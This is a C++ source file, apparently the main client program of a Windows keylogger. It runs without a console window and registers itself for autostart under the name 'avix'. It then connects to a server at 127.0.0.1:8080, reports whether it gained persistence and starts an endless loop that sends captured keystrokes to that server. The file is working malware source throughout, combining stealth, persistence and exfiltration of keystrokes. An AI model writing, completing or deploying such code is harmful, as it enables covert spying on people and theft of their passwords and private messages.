//CLIENT

#include "keylogger.h"
#include "client.h"
#include "autostart.h"
#include <Windows.h>



using namespace std;



int WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPTSTR    lpCmdLine,
int       cmdShow)
//int main()
{
	Autostart autos(L"avix");;
	if (!autos.IsMyProgramRegisteredForStartup())
	{
		autos.RegisterProgram();
	}

	Client client(8080, "127.0.0.1");
	client.c_connect();

		if (autos.IsMyProgramRegisteredForStartup())
			client.sender("5$Program is registered for startup!");
		else
			client.sender("5$Program is NOT registered for startup!");

	Keylogger k;
	k.start(client); //endless loop
}